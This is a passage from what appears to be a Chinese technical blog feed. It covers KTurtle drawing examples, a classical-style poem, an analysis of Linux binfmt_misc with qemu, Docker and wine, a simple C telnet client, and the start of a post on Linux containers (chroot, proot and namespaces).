</code></pre><p>效果如图所示：</p>
<p><img src="/images/kturtle-decagon.png" alt></p>
<p>可以看到，当正多边形的边数为10时，还不是很圆，我们再来试下边数为60的情况：</p>
<pre><code>reset
forward 10
repeat 59 {
  turnleft 6
  forward 10
}
</code></pre><p><img src="/images/kturtle-polygon-60.png" alt></p>
<p>可以看到此时已经非常圆了，肉眼几乎看不出与圆形的差别了。</p>
<h2 id="0x04-画一个正方形螺线"><a href="#0x04-画一个正方形螺线" class="headerlink" title="0x04 画一个正方形螺线"></a>0x04 画一个正方形螺线</h2><p>正方形螺线是一个边长一直在增长的正方形，为了实现这样的效果，需要用到<code>变量(Variable)</code>。</p>
<p>在TurtleScript中使用<code>$x</code>方式表示变量，可以直接赋值或访问。</p>
<p>我们可以先定义一个初始值为<code>5</code>的变量<code>$len</code>，表示一开始的变长为<code>5</code>，然后经过两次拐弯后，将边长加5，继续循环。完整的代码如下：</p>
<pre><code>reset
$len = 5
repeat 40 {
  repeat 2 {
    forward $len
    turnleft 90
  }
  $len = $len + 5
}
</code></pre><p>效果如图所示：</p>
<p><img src="/images/kturtle-spiral.png" alt></p>
<h2 id="0x05-利用函数进行逻辑复用"><a href="#0x05-利用函数进行逻辑复用" class="headerlink" title="0x05 利用函数进行逻辑复用"></a>0x05 利用函数进行逻辑复用</h2><p>对于重复性工作，可以通过函数来实现。在KTurtle中可以使用<code>learn</code>指令定义函数。下面是一段根据起点和终点画直线的函数代码：</p>
<pre><code>learn drawLine $x1, $y1, $x2, $y2 {
  go $x1, $y1
  if $x2 - $x1 &gt; 0 {
    $angle = arctan ($y2 - $y1) / ($x2 - $x1)
    direction 90 + $angle
  } else if $x2 - $x1 &lt; 0 {
    $angle = arctan ($y2 - $y1) / ($x2 - $x1)
    direction -90 + $angle
  } else {
    if $y2 - $y1 &gt; 0 {
      direction 180
    } else {
      direction 0
    }
  }

  forward sqrt ($y2 - $y1) ^ 2 + ($x2 - $x1) ^ 2
}
</code></pre><p>这段代码中还包含了<code>if</code>/<code>else</code>分支语句，可以用来进行条件判断。</p>
<p>因此，如果想画一个梯形可以使用以下代码：</p>
<pre><code>drawLine 100, 100, 200, 100
drawLine 100, 100, 50, 200
drawLine 50, 200, 300, 200
drawLine 200, 100, 300, 200
</code></pre><p><img src="/images/kturtle-trapezoid.png" alt></p>
<h2 id="0x06-其它设置"><a href="#0x06-其它设置" class="headerlink" title="0x06 其它设置"></a>0x06 其它设置</h2><h3 id="设置背景颜色"><a href="#设置背景颜色" class="headerlink" title="设置背景颜色"></a>设置背景颜色</h3><pre><code>canvascolor 07, 55, 140
</code></pre><h3 id="设置画笔颜色"><a href="#设置画笔颜色" class="headerlink" title="设置画笔颜色"></a>设置画笔颜色</h3><pre><code>pencolor 160, 0, 0
</code></pre><h3 id="设置画笔粗细"><a href="#设置画笔粗细" class="headerlink" title="设置画笔粗细"></a>设置画笔粗细</h3><pre><code>penwidth 3
</code></pre><h2 id="0x07-一个相对复杂的例子"><a href="#0x07-一个相对复杂的例子" class="headerlink" title="0x07 一个相对复杂的例子"></a>0x07 一个相对复杂的例子</h2><pre><code>reset
canvascolor 07  , 55, 140
pencolor 160, 0, 0
penwidth 3

go 130, 150
direction 0

repeat 8 {
  repeat 8 {
    forward 20
    turnright 15
  }
  repeat 7 {
    forward 20
    turnright 15
  }
  repeat 36 {
    forward 6
    turnright 10
  }
}
</code></pre><p><img src="/images/kturtle-flower.png" alt></p>
<h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>KTurtle是很容易上手的编程学习工具，对于初学者理解编程中常见的<code>变量</code>、<code>条件</code>、<code>循环</code>、<code>函数</code>等概念具有较大帮助，同时也可以加深对几何知识的理解。</p>
]]></content>
  </entry>
  <entry>
    <title>怜香辞</title>
    <url>/2017/01/14/lian-xiang-ci/</url>
    <content><![CDATA[<p>怜美人之徜徉兮，郁郁而寡欢<br>青丝凌凌而猗靡兮，暗自悲悯欲绝<br>面若初桃兮带雨，腰恰细柳兮销魂<br>残黛双蹙，粉眼凝山<br>朱唇几褪，皓齿贝连<br>冰肌玉骨，风掀翠衫  </p>
<p>忆曩昔之欢娱兮，愁云弥散<br>携手伴游石城兮，幽亭共凭阑<br>步逍遥而无忧兮，笑语厌厌  </p>
<p>孰料风云之幻兮，须臾莫辨<br>风雨骤临凄凄兮，软玉难牵<br>孤夜茕独垂泪兮，枕席湿眠<br>何旧人之难却兮，思怨益切<br>詈雄兔之负心兮，雌兔独痴情<br>乐新而弃故兮，顾之于漠漠<br>何怀伤于斯人兮，全不念昔日缠绵  </p>
<p>羡潘岳之貌美兮，仰少游之文才<br>梦韩寿之窃玉兮，羲之卧于东床<br>叹琼瑶之难报兮，襄王早别巫颠<br>奈子夫之滋泽兮，阿娇依伫长门<br>红颜无脱迟暮兮，斯人至死不解<br>天与地何其渺兮，重觅世间佳婿<br>相随老死不离兮，轻笑长浮脸际 </p>
<p>忽而伊观余似悟此间，颜顿开，飘然远逝。</p>
]]></content>
      <categories>
        <category>诗词</category>
      </categories>
  </entry>
  <entry>
    <title>Linux中的binfmt-misc原理分析</title>
    <url>/2024/02/07/linux-binfmts/</url>
    <content><![CDATA[<h2 id="0x00-什么是binfmt-misc"><a href="#0x00-什么是binfmt-misc" class="headerlink" title="0x00 什么是binfmt-misc"></a>0x00 什么是binfmt-misc</h2><p>binfmt-misc(Miscellaneous Binary Format)是Linux内核提供的一种类似Windows上文件关联的功能，但比文件关联更强大的是，它不仅可以根据文件后缀名判断，还可以根据文件内容(Magic Bytes)使用不同的程序打开。一个典型的使用场景就是：使用<code>qemu</code>运行其它架构平台上的二进制文件。</p>
<p>本文以该场景为例，分析一下其具体的工作原理。</p>
<h2 id="0x01-开启binfmt-misc"><a href="#0x01-开启binfmt-misc" class="headerlink" title="0x01 开启binfmt-misc"></a>0x01 开启binfmt-misc</h2><p>临时开启可以使用以下命令：</p>
<pre><code class="bash">$ sudo mount binfmt_misc -t binfmt_misc /proc/sys/fs/binfmt_misc
</code></pre>
<p>这种方式重启后会失效，如果想长期生效，可以在<code>/etc/fstab</code>文件中增加一行：</p>
<pre><code>none  /proc/sys/fs/binfmt_misc binfmt_misc defaults 0 0
</code></pre><p>可以使用以下命令检查开启是否成功：</p>
<pre><code class="bash">$ mount | grep binfmt_misc
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
$ ls -l /proc/sys/fs/binfmt_misc
总用量 0
--w------- 1 root root 0 2月   5 22:55 register
-rw-r--r-- 1 root root 0 2月   5 22:55 status
</code></pre>
<h2 id="0x02-在x86-64系统中运行arm64应用"><a href="#0x02-在x86-64系统中运行arm64应用" class="headerlink" title="0x02 在x86_64系统中运行arm64应用"></a>0x02 在x86_64系统中运行arm64应用</h2><p>先准备一个arm64架构的程序(可以使用go跨平台编译生成一个)，执行后发现有报错：</p>
<pre><code>bash: ./go-test：无法执行二进制文件: 可执行文件格式错误
</code></pre><p>现在，我们执行一下<code>apt install qemu-user-binfmt</code>命令，然后再运行上面的arm64程序，发现能正常运行了。安装<code>qemu-user-binfmt</code>后，会在<code>/proc/sys/fs/binfmt_misc</code>目录下创建若干个文件，其中就有一个<code>qemu-aarch64</code>。来看一下这个文件的内容：</p>
<pre><code class="bash">$ cat /proc/sys/fs/binfmt_misc/qemu-aarch64
enabled
interpreter /usr/libexec/qemu-binfmt/aarch64-binfmt-P
flags: POC
offset 0
magic 7f454c460201010000000000000000000200b700
mask ffffffffffffff00fffffffffffffffffeffffff
</code></pre>
<p>这个文件描述的是规则文件，第一行<code>enabled</code>表示该规则启用；第二行<code>interpreter /usr/libexec/qemu-binfmt/aarch64-binfmt-P</code>表示使用<code>/usr/libexec/qemu-binfmt/aarch64-binfmt-P</code>来执行二进制文件；第三行<code>flags: POC</code>表示运行的标志位，具体含义如下：</p>
<ul>
<li><code>P</code>: 表示perserve-argv，这意味着在调用模拟器时，原始的参数（argv）将被保留。这对于某些程序在运行时需要知道它们自己的名称（即argv[0]）的情况很有用</li>
<li><code>O</code>: 表示offset，这意味着在启动模拟器之前，需要从二进制文件中读取一个偏移量。这个偏移量将作为模拟器的一个参数</li>
<li><code>C</code>: 表示credentials，这意味着模拟器将使用与原始程序相同的用户ID和组ID运行。这有助于确保模拟器在运行时具有与原始程序相同的权限</li>
</ul>
<p>第四行<code>offset 0</code>表示从<code>0</code>偏移值开始读取文件；第五行<code>magic 7f454c460201010000000000000000000200b700</code>表示要匹配的魔术字节；<code>mask ffffffffffffff00fffffffffffffffffeffffff</code>表示字节掩码，用来忽略掉文件中的一些不重要的字节。</p>
<p>可以看出，这条规则会使用<code>/usr/libexec/qemu-binfmt/aarch64-binfmt-P</code>来执行arm64架构的二进制文件，而这个文件其实是一个软链，实际指向的是：<code>/usr/bin/qemu-aarch64</code>。</p>
<h2 id="0x03-手动创建执行规则"><a href="#0x03-手动创建执行规则" class="headerlink" title="0x03 手动创建执行规则"></a>0x03 手动创建执行规则</h2><p>在上面的例子中，<code>/proc/sys/fs/binfmt_misc/qemu-aarch64</code>文件是在安装qemu库的时候自动安装进去的。如果想手动创建一条规则，该怎么操作呢？</p>
<p>我们先将以下代码保存到文件<code>main.go</code>中：</p>
<pre><code class="go">package main

import (
    &quot;fmt&quot;
    &quot;os&quot;
)

func main() {
    fmt.Println(&quot;Program name:&quot;, os.Args[0])

    if len(os.Args) &gt; 1 {
        fmt.Println(&quot;Arguments:&quot;)
        for i, arg := range os.Args[1:] {
            fmt.Printf(&quot;Arg %d: %s\n&quot;, i+1, arg)
        }
    } else {
        fmt.Println(&quot;No arguments provided.&quot;)
    }
}
</code></pre>
<p>使用命令：<code>go build -o fake-runner ./main.go</code>进行编译，并将编译出来的<code>fake-runner</code>拷贝到<code>/usr/local/bin</code>目录下。</p>
<p>此时，我们需要向<code>/proc/sys/fs/binfmt_misc/register</code>中按照<code>:name:type:offset:magic:mask:interpreter:flags</code>的格式写入规则。</p>
<ul>
<li>name: 规则名</li>
<li>type: 类型，取<code>E</code>(按扩展名匹配)或<code>M</code>(按文件魔术字节匹配)之一</li>
<li>offset: 当<code>type</code>为<code>M</code>时生效，表示魔术字节的偏移值</li>
<li>magic: 当<code>type</code>为<code>E</code>时，表示要匹配的后缀名；当<code>type</code>为<code>M</code>时，表示16进制的魔术字节</li>
<li>mask: 当<code>type</code>为<code>M</code>时生效，表示魔术字节的掩码，与IP地址掩码类似</li>
<li>interpreter: 解释器文件的绝对路径</li>
<li>flags: 含义与上面的<code>flags</code>一致</li>
</ul>
<p>假设我们想用<code>fake-runner</code>打开以<code>12344578</code>开头的文件，可以执行以下命令：</p>
<pre><code class="bash"># echo &#39;:binfmt-test:M::12345678::/usr/local/bin/fake-runner:P&#39; &gt; /proc/sys/fs/binfmt_misc/register
# cat /proc/sys/fs/binfmt_misc/binfmt-test enabled
interpreter /usr/local/bin/fake-runner
flags: P
offset 0
magic 3132333435363738
</code></pre>
<p>此命令需要在root权限下运行。</p>
<p>然后使用命令生成目标文件：</p>
<pre><code class="bash">$ echo 12345678 &gt; /tmp/test.txt
$ chmod 755 /tmp/test.txt
$ /tmp/test.txt hello
Program name: /usr/local/bin/fake-runner
Arguments:
Arg 1: /tmp/test.txt
Arg 2: /tmp/test.txt
Arg 3: hello
</code></pre>
<p>删除规则可以使用命令：<code>echo -1 &gt; /proc/sys/fs/binfmt_misc/binfmt-test</code></p>
<h2 id="0x04-在x86-64系统中运行arm64架构的Docker镜像"><a href="#0x04-在x86-64系统中运行arm64架构的Docker镜像" class="headerlink" title="0x04 在x86_64系统中运行arm64架构的Docker镜像"></a>0x04 在x86_64系统中运行arm64架构的Docker镜像</h2><p>现在我们用docker命令运行一个arm64的镜像：</p>
<pre><code class="bash">$ docker run -it arm64v8/ubuntu bash
Unable to find image &#39;arm64v8/ubuntu:latest&#39; locally
latest: Pulling from arm64v8/ubuntu
005e2837585d: Pull complete 
Digest: sha256:ba545858745d6307f0d1064d0d25365466f78d02f866cf4efb9e1326a4c196ca
Status: Downloaded newer image for arm64v8/ubuntu:latest
standard_init_linux.go:207: exec user process caused &quot;no such file or directory&quot;
</code></pre>
<p>通过一番探索之后，发现只要执行下命令：<code>apt install qemu-user-static</code>，再启动docker容器就正常了。执行这条命令会修改<code>/usr/libexec/qemu-binfmt/aarch64-binfmt-P</code>文件的软链到<code>/usr/bin/qemu-aarch64-static</code>。我们来看下<code>qemu-aarch64</code>和<code>qemu-aarch64-static</code>区别：</p>
<pre><code class="bash">$ readelf -d /usr/bin/qemu-aarch64
Dynamic section at offset 0x3aee38 contains 37 entries:
  标记        类型                         名称/值
 0x0000000000000001 (NEEDED)             共享库：[libz.so.1]
 0x0000000000000001 (NEEDED)             共享库：[librt.so.1]
 0x0000000000000001 (NEEDED)             共享库：[libcapstone.so.4]
 0x0000000000000001 (NEEDED)             共享库：[libglib-2.0.so.0]
 0x0000000000000001 (NEEDED)             共享库：[libgnutls.so.30]
 0x0000000000000001 (NEEDED)             共享库：[libgmodule-2.0.so.0]
 0x0000000000000001 (NEEDED)             共享库：[libstdc++.so.6]
 0x0000000000000001 (NEEDED)             共享库：[libm.so.6]
 0x0000000000000001 (NEEDED)             共享库：[libgcc_s.so.1]
 0x0000000000000001 (NEEDED)             共享库：[libpthread.so.0]
 0x0000000000000001 (NEEDED)             共享库：[libc.so.6]
 0x000000000000000c (INIT)               0xab000
 0x000000000000000d (FINI)               0x2a83ec
 0x0000000000000019 (INIT_ARRAY)         0x35b8e0
 0x000000000000001b (INIT_ARRAYSZ)       248 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x35b9d8
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x340
 0x0000000000000005 (STRTAB)             0x2a608
 0x0000000000000006 (SYMTAB)             0xa1f0
 0x000000000000000a (STRSZ)              122726 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x3b00c8
 0x0000000000000002 (PLTRELSZ)           11136 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0xa7f68
 0x0000000000000007 (RELA)               0x4b2e0
 0x0000000000000008 (RELASZ)             380040 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000000000001e (FLAGS)              BIND_NOW
 0x000000006ffffffb (FLAGS_1)            标志： NOW PIE
 0x000000006ffffffe (VERNEED)            0x4b070
 0x000000006fffffff (VERNEEDNUM)         7
 0x000000006ffffff0 (VERSYM)             0x4856e
 0x000000006ffffff9 (RELACOUNT)          15807
 0x0000000000000000 (NULL)               0x0

$ readelf -d /usr/bin/qemu-aarch64-static
There is no dynamic section in this file.
</code></pre>
<p>可以看出，qemu-aarch64-static是没有动态库依赖的，也就是说，docker必须使用静态编译的<code>qemu</code>才能工作。通过这种方式，可以实现在x86_64机器上编译跨架构镜像的目的。</p>
<h2 id="0x05-跨架构编译Docker镜像"><a href="#0x05-跨架构编译Docker镜像" class="headerlink" title="0x05 跨架构编译Docker镜像"></a>0x05 跨架构编译Docker镜像</h2><p>要支持多架构，需要开启Docker的实验功能，开启方式如下：</p>
<p>在文件<code>/etc/docker/daemon.json</code>中添加如下配置</p>
<pre><code class="json">{
    &quot;experimental&quot;: true
}
</code></pre>
<p>然后使用<code>sysemcrtl restart docker</code>命令重启Docker服务。</p>
<pre><code class="bash">$ docker info | grep -i &#39;experimental&#39;
 Experimental: true
</code></pre>
<p>当看到以上输出时，就表示实验功能已开启。</p>
<p>编写以下Dockerfile:</p>
<pre><code class="Dockerfile">FROM ubuntu:20.04

RUN set -ex &amp;&amp; apt update
</code></pre>
<p>然后使用以下命令编译arm64镜像</p>
<pre><code class="bash">$ sudo docker build --platform linux/arm64 -t ubuntu .
$ sudo docker run -it ubuntu bash
root@616a3dd3a915:/# uname -a
Linux 616a3dd3a915 5.15.34-amd64-desktop #2 SMP Mon May 16 16:31:30 CST 2022 aarch64 aarch64 aarch64 GNU/Linux
</code></pre>
<p>因此，使用<code>--platform linux/arm64</code>参数就可以编译出arm64架构的镜像。</p>
<h2 id="0x06-在Linux上运行Windows可执行文件"><a href="#0x06-在Linux上运行Windows可执行文件" class="headerlink" title="0x06 在Linux上运行Windows可执行文件"></a>0x06 在Linux上运行Windows可执行文件</h2><p>使用<code>binfmt-misc</code>机制可以支持直接在Linux上运行Windows的exe文件，这是通过wine来实现的。</p>
<pre><code class="bash">$ cat /proc/sys/fs/binfmt_misc/DOSWin
enabled
interpreter /usr/bin/wine
flags: 
offset 0
magic 4d5a
$ ls -l /usr/bin/wine
lrwxrwxrwx 1 root root 19 10月  8 18:09 /usr/bin/wine -&gt; deepin-wine6-stable
</code></pre>
<p>deepin-wine6-stable其实是一个bash脚本：</p>
<pre><code class="bash">#!/bin/bash

name=${0##*/}
bindir=/usr/lib/$name

wine32=/opt/$name/bin/wine
wine64=/opt/$name/bin/wine64

if test -x $wine32 -a &quot;$WINEARCH&quot; != &quot;win64&quot;; then
    wine=$wine32
elif test -x $wine64; then
    wine=$wine64
    if [ &quot;$(dpkg --print-architecture)&quot; = &quot;amd64&quot; -a &quot;$(dpkg --print-foreign-architectures | grep -cx &quot;i386&quot;)&quot; -ne 1 ]; then
        echo &quot;it looks like multiarch needs to be enabled.  as root, please&quot;
        echo &quot;execute \&quot;dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp;&quot;
        echo &quot;apt-get install $(echo $name | sed s/wine/wine32/)\&quot;&quot;
    fi
else
    echo &quot;error: unable to find wine executable.  this shouldn&#39;t happen.&quot;
    exit 1
fi

if test -z &quot;$WINEPREFIX&quot;; then
    if test &quot;$wine&quot; = &quot;$wine64&quot;; then
        wineprefix=$HOME/.wine64
    else
        wineprefix=$HOME/.wine
    fi
else
    wineprefix=$WINEPREFIX
fi

if test -z &quot;$WINELOADER&quot;; then
    wineloader=$wine
else
    wineloader=$WINELOADER
fi

if test -z &quot;$WINEDEBUG&quot;; then
    winedebug=-all
else
    winedebug=$WINEDEBUG
fi

runtime_path=/opt/deepinwine/runtime-i386

export LD_LIBRARY_PATH=&quot;/opt/$name/lib:/opt/$name/lib64:$LD_LIBRARY_PATH&quot;
export WINEDLLPATH=/opt/$name/lib:/opt/$name/lib64

# 32位wine需要指定32位runtime的路径
if [ -f &quot;$runtime_path/init_runtime.sh&quot; -a &quot;$wine&quot; = &quot;$wine32&quot; ];then
    source &quot;$runtime_path/init_runtime.sh&quot;

    PE_FILE=&quot;$1&quot;
    if [[ &quot;$1&quot; == *&quot;.exe&quot; ]]; then
        PE_FILE=${PE_FILE//\\/\/}
        drive=${PE_FILE:0:2}
        if [[ ${drive} == &quot;c:&quot;* || ${drive} == &quot;C:&quot;* ]]; then
            PE_FILE=${wineprefix}/drive_c${PE_FILE:2}
        fi
    fi

    init_runtime
    if [ -f &quot;$PE_FILE&quot; ];then
        #only 32 bit application need config this envs
        if file &quot;$PE_FILE&quot; | grep -q -e &quot;PE32 &quot;; then
            init_32bit_config
        fi
    fi
    export WINELOADERNOEXEC=1
    winepreloader=/opt/$name/bin/wine-preloader
    WINEPREFIX=$wineprefix WINELOADER=$wineloader WINEDEBUG=$winedebug $winepreloader $wine &quot;$@&quot;
else
    WINEPREFIX=$wineprefix WINELOADER=$wineloader WINEDEBUG=$winedebug $wine &quot;$@&quot;
fi
</code></pre>
<p>因此，直接在命令行中输入一个exe文件路径，例如扫雷游戏，就会看到系统打开了扫雷游戏界面。</p>
<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>binfmt-misc提供了灵活的文件关联机制，使得部分无法直接执行的程序可以像普通Linux程序一样直接运行起来（如：跨架构程序、Windows exe等）。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>binfmts</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux上C语言写的简易telnet客户端</title>
    <url>/2017/08/06/linux-c-telnet/</url>
    <content><![CDATA[<p>telnet.c</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;  
#include &lt;netinet/in.h&gt; 
#include &lt;netdb.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;signal.h&gt;
#include &lt;time.h&gt;
#include &lt;stdarg.h&gt;

#define ERR_EXIT(m, ...) \  
    do { \  
        fprintf(stderr, m&quot;\n&quot;, ##__VA_ARGS__); \  
        log(m&quot;\n&quot;, ##__VA_ARGS__); \
        exit(EXIT_FAILURE); \  
    } while (0) 
#define MAX_BUFF_LEN 1024

void log(const char *fmt, ...)
{
    char buffer[MAX_BUFF_LEN] = {0};
    va_list args;
    time_t timep;
    time(&amp;timep);
    struct tm *p = gmtime(&amp;timep);
    FILE* fp = fopen(&quot;telnet.log&quot;, &quot;a+&quot;);
    if(fp){
        snprintf(buffer, MAX_BUFF_LEN, &quot;[%.4d-%.2d-%.2d %.2d:%.2d:%.2d][%d]&quot;, (1900+p-&gt;tm_year),(1+p-&gt;tm_mon), p-&gt;tm_mday, p-&gt;tm_hour, p-&gt;tm_min, p-&gt;tm_sec, getpid());
        va_start(args, fmt);
        vsnprintf(buffer + strlen(buffer), MAX_BUFF_LEN - strlen(buffer) - 1, fmt, args);
        va_end(args);
        fwrite(buffer, strlen(buffer), 1, fp);
        fclose(fp);
    }
}

ssize_t      /* Write &quot;n&quot; bytes to a descriptor. */
writen(int fd, const void *vptr, size_t n){
    size_t  nleft;
    ssize_t  nwritten;
    const char *ptr;
    ptr = vptr;
    nleft = n;
    while (nleft &gt; 0) {
        if ( (nwritten = write(fd, ptr, nleft)) &lt;= 0) {
            if (nwritten &lt; 0 &amp;&amp; errno == EINTR)
                nwritten = 0;  /* and call write() again */
            else
                return(-1);   /* error */
        }
        nleft -= nwritten;
        ptr   += nwritten;
    }
    return(n);
}

int main(int argc,char **argv){
    if(argc &lt; 3){
        fprintf(stderr, &quot;Usage: %s ServerIPAddress ServerPort\n&quot;,argv[0]);
        return 0;
    }

    fd_set rset;
    FD_ZERO(&amp;rset);
    int sock = socket(AF_INET,SOCK_STREAM,0);
    struct sockaddr_in server_addr;
    memset(&amp;server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;    //internet协议族
    struct hostent *h = gethostbyname(argv[1]);
    server_addr.sin_addr = *((struct in_addr *)h-&gt;h_addr);
    server_addr.sin_port = htons(atoi(argv[2]));
    if(connect(sock,(struct sockaddr*)&amp;server_addr, sizeof(struct sockaddr_in)) &lt; 0){
        ERR_EXIT(&quot;connect to %s:%s failed&quot;, argv[1], argv[2]);
    }

    fprintf(stdout, &quot;% 9d\n&quot;, getpid());
    fflush(stdout);

    int nready;  
    int maxfd;  
    int fd_stdin = fileno(stdin);
    int fd_stdout = fileno(stdout);
    if (fd_stdin &gt; sock)  
        maxfd = fd_stdin;  
    else  
        maxfd = sock;  
    char sendbuf[1024*4] = {0};  
    char recvbuf[1024*4] = {0};  

    while (1){  
        FD_SET(fd_stdin, &amp;rset);  
        FD_SET(sock, &amp;rset);  
        nready = select(maxfd + 1, &amp;rset, NULL, NULL, NULL); //select返回表示检测到可读事件  
        if (nready == -1) ERR_EXIT(&quot;select error&quot;);  
        if (nready == 0) continue;  
        if (FD_ISSET(sock, &amp;rset)){  
            int ret = read(sock, recvbuf, sizeof(recvbuf)); //按行读取  
            if (ret == -1) ERR_EXIT(&quot;read from socket error&quot;);  
            else if (ret  == 0) ERR_EXIT(&quot;server close&quot;);  //服务器关闭  

            writen(fd_stdout, recvbuf, ret);
            memset(recvbuf, 0, sizeof(recvbuf));  
        }  
        if (FD_ISSET(fd_stdin, &amp;rset)){  
            int ret = read(fd_stdin, sendbuf, sizeof(sendbuf));
            if(ret &gt; 0) {
                writen(sock, sendbuf, ret);  
                memset(sendbuf, 0, sizeof(sendbuf));
            }else{
                ERR_EXIT(&quot;read from stdin error&quot;);                
            }
        }  
    }  
    close(sock);  
    exit(0);
}
</code></pre><p>编译方法：</p>
<blockquote>
<p>gcc -o telnet telnet.c</p>
</blockquote>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>telnet</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux容器——那些你不知道的事</title>
    <url>/2021/09/22/linux-container/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>容器是指一种系统级的虚拟化技术，想比于KVM等内核级的虚拟化技术，具有更加轻量的特点。随着Docker技术以及k8s容器编排引擎的流行，容器在云原生时代扮演着绝对重要的角色。但事实上，容器技术自从Unix时代就已经出现，并且存在着多种容器方案，不同的容器方案之间既有相同点，也有不同点。</p>
<h2 id="0x01-最早的容器化技术——chroot"><a href="#0x01-最早的容器化技术——chroot" class="headerlink" title="0x01 最早的容器化技术——chroot"></a>0x01 最早的容器化技术——chroot</h2><p>最早的容器是1979年由UNIX实现的Chroot Jail。通过chroot技术，实现了独立的系统目录结构，从而支持运行指定的操作系统。</p>
<p><img src="/images/chroot.png" alt></p>
<pre><code class="bash">$ wget https://mirrors.tuna.tsinghua.edu.cn/ubuntu-cdimage/ubuntu-base/releases/20.04.3/release/ubuntu-base-20.04.3-base-amd64.tar.gz
$ tar zxvf ubuntu-base-20.04.3-base-amd64.tar.gz
$ sudo mount -o bind /proc proc
$ sudo mount -o bind /dev dev
$ sudo mount -o bind /etc/resolv.conf etc/resolv.conf
$ sudo chroot .
# cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION=&quot;Ubuntu 20.04.3 LTS&quot;
</code></pre>
<p>此时，就进入了<code>Ubuntu 2004</code>的环境，不过这是一个只进行了文件系统隔离的容器，没有做进程、网络、资源等隔离，安全性较差，对于本地使用倒是足够了。</p>
<p>相对于Docker，这种方式在容器内的操作会保存到文件系统，因此退出以后再次进入还会保留之前的状态。可以使用这种方式来管理多个非临时容器环境（例如本地的多个测试环境）。</p>
<h3 id="获取系统镜像压缩包"><a href="#获取系统镜像压缩包" class="headerlink" title="获取系统镜像压缩包"></a>获取系统镜像压缩包</h3><p>除了直接使用操作系统提供的压缩包，还可以通过docker获取，这种方式会更简单通用。</p>
<pre><code class="bash">$ sudo docker run -it ubuntu:20.04 bash
root@762063502a65:/# apt update
root@762063502a65:/# apt install curl
$ sudo docker container export 762063502a65 -o ubuntu20.04.tar
$ tar xvf ubuntu20.04.tar
</code></pre>
<p>这里可以先对镜像做一些操作，然后再导出成压缩包。</p>
<h3 id="proot"><a href="#proot" class="headerlink" title="proot"></a>proot</h3><p><a href="https://proot-me.github.io/https://proot-me.github.io/" target="_blank" rel="noopener">proot</a>是一款用户空间的<code>chroot</code>、<code>mount</code>、<code>binfmt_miscbinfmt_misc</code>实现。它可以在非root场景下代替<code>chroot</code>，因此在Android等不方便root的设备上应用比较广泛。</p>
<p>proot利用<code>ptrace</code>去拦截子进程中的系统调用，从而达到替换系统调用结果的目的。但这种方式也会产生一定的性能损耗。</p>
<pre><code class="bash">$ proot -r ./ubuntu-20.04.3 -b /proc:/proc cat /etc/lsb-release
proot info: default working directory is now &quot;/&quot;
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION=&quot;Ubuntu 20.04.3 LTS&quot;
</code></pre>
<h2 id="0x02-Linux资源隔离方案——Namespace"><a href="#0x02-Linux资源隔离方案——Namespace" class="headerlink" title="0x02 Linux资源隔离方案——Namespace"></a>0x02 Linux资源隔离方案——Namespace</h2><p>chroot容器只是实现了容器最基本的功能，支持了文件系统的隔离，但是其它资源，像进程、用户、网络这些都是与宿主机共享的。</p>
<p>为了支持资源隔离，Linux提供了<code>Namespace（命名空间）</code>解决方案。PID, IPC, Network等系统资源不再是全局性的，而是属于某个特定的Namespace。不同命名空间下的进程只能访问当前命名空间内的资源，无法访问其它命名空间里的资源，从而做到了资源隔离。</p>
<p><img src="/images/linux-namespace.png" alt></p>
<p>可以使用<code>unshare</code>命令创建新的命名空间，基本原理是在创建子进程的时候加入了对应的命名空间标记位，源代码地址为：<a href="https://github.com/util-linux/util-linux/blob/master/sys-utils/unshare.chttps://github.com/util-linux/util-linux/blob/master/sys-utils/unshare.c" target="_blank" rel="noopener">https://github.com/util-linux/util-linux/blob/master/sys-utils/unshare.c</a>。下面是该命令的使用帮助：</p>
<pre><code class="bash">$ unshare --help

Usage:
 unshare [options] [&lt;program&gt; [&lt;argument&gt;...]]

Run a program with some namespaces unshared from the parent.

Options:
 -m, --mount[=&lt;file&gt;]      unshare mounts namespace
 -u, --uts[=&lt;file&gt;]        unshare UTS namespace (hostname etc)
 -i, --ipc[=&lt;file&gt;]        unshare System V IPC namespace
 -n, --net[=&lt;file&gt;]        unshare network namespace
 -p, --pid[=&lt;file&gt;]        unshare pid namespace
 -U, --user[=&lt;file&gt;]       unshare user namespace
 -C, --cgroup[=&lt;file&gt;]     unshare cgroup namespace
 -T, --time[=&lt;file&gt;]       unshare time namespace

 -f, --fork                fork before launching &lt;program&gt;
 --map-user=&lt;uid&gt;|&lt;name&gt;   map current user to uid (implies --user)
 --map-group=&lt;gid&gt;|&lt;name&gt;  map current group to gid (implies --user)
 -r, --map-root-user       map current user to root (implies --user)
 -c, --map-current-user    map current user to itself (implies --user)
 --map-auto                map users and groups automatically (implies --user)
 --map-users=&lt;outeruid&gt;,&lt;inneruid&gt;,&lt;count&gt;
                           map count users from outeruid to inneruid (implies --user)
